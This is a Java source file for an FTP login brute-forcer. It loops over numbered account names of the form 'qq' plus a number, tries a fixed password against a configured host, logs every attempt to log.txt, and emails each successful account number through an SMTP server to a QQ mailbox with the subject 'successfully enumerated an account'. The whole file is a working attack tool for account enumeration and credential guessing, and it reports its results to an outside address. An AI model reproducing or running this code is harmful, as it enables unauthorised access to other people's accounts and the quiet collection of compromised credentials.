package com.robin;

import java.net.SocketException;
import org.apache.commons.net.ftp.FTPClient;
import java.io.IOException;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import java.util.Date;
import java.util.Properties;

class goFtp extends Ftp {
	public goFtp(int _port, String _host, String _password, int _user) {
		super(_port, _host, _password, _user);
	}

	@Override
	public void goLogin() throws Exception {
		FTPClient ftp = new FTPClient();
		while (true) {
			try {
				ftp.connect(this.host, this.port);
				if (ftp.login("qq" + Integer.toString(this.user), this.password) == true) {
					loginWin();
				} else {
					// System.out.println("登录失败");
					setRecord("失败");
				}
			} catch (SocketException e) {
				System.out.println("登录失败");
				setRecord("失败");
			} catch (IOException e) {
				System.out.println("host错误");
				setRecord("host错误");
				try {
					Thread.currentThread();
					System.out.println("3秒后重新尝试连接服务器...");
					Thread.sleep(1000);// 延时
					System.out.println("2秒后重新尝试连接服务器...");
					Thread.sleep(1000);// 延时
					System.out.println("1秒后重新尝试连接服务器...");
					Thread.sleep(1000);// 延时
				} catch (Exception e1) {
					e1.printStackTrace();
				}
				this.user--;
			}
			this.user++;

			System.out.println(this.user);
		}
	}

	/*
	 * 登录成功后的操作: 记录>发送记录
	 */
	@Override
	public void loginWin() throws Exception {
		System.out.println("登录成功:\n账号:" + this.user + "\n密码" + this.password + "\n");
		setRecord("成功");
		sendRecord();
	}

	/*
	 * 写入log.txt>如果文件不存在就新建>然后写入文件
	 */
	@Override
	public void setRecord(String state) {
		File file = new File(System.getProperty("user.dir")+"\\log.txt");
		if (file.exists() == false) {
			try {
				file.createNewFile();
				System.out.println("新建log.txt成功");
			} catch (IOException e) {
				System.out.println("新建log.txt失败");
			}
		}
		try {
			FileWriter fw = new FileWriter(file, true);
			BufferedWriter bw = new BufferedWriter(fw);
			bw.write(state + "   " + Integer.toString(this.user) + "   " + this.password + "\r\n");
			bw.close();
		} catch (IOException e) {
			System.out.println("写入log.txt失败");
		}

	}

	@Override
	public void sendRecord() throws Exception {
		String myEmailAccount = "llll1032740078@163.com";
		String myEmailPassword = "xxxxxxx";
		String myEmailSMTPHost = "smtp.163.com";
		String receiveMailAccount = "1032740078@qq.com";// 收件人邮箱
		Properties props = new Properties(); // 参数配置
		props.setProperty("mail.transport.protocol", "smtp"); // 使用的协议（JavaMail规范要求）
		props.setProperty("mail.smtp.host", myEmailSMTPHost); // 发件人的邮箱的SMTP,服务器地址
		props.setProperty("mail.smtp.auth", "true"); // 需要请求认证
		Session session = Session.getInstance(props);
		session.setDebug(true); // 设置为debug模式, 可以查看详细的发送 log
		MimeMessage message = createMimeMessage(session, myEmailAccount, receiveMailAccount, this.user);
		Transport transport = session.getTransport();
		transport.connect(myEmailAccount, myEmailPassword);
		transport.sendMessage(message, message.getAllRecipients());
		transport.close();
	}

	/**
	 * 创建一封只包含文本的简单邮件
	 *
	 * @param session
	 *            和服务器交互的会话
	 * @param sendMail
	 *            发件人邮箱
	 * @param receiveMail
	 *            收件人邮箱
	 * @return
	 * @throws Exception
	 */
	public static MimeMessage createMimeMessage(Session session, String sendMail, String receiveMail, int user)
			throws Exception {
		MimeMessage message = new MimeMessage(session);
		message.setFrom(new InternetAddress(sendMail, "Robin小助手", "UTF-8"));
		message.setRecipient(MimeMessage.RecipientType.TO, new InternetAddress(receiveMail, "梁小凯", "UTF-8"));
		message.setSubject("成功枚举出账号一个:" + Integer.toString(user), "UTF-8");
		message.setContent("成功枚举出账号一个:" + Integer.toString(user), "text/html;charset=UTF-8");
		message.setSentDate(new Date());
		message.saveChanges();
		return message;
	}

}
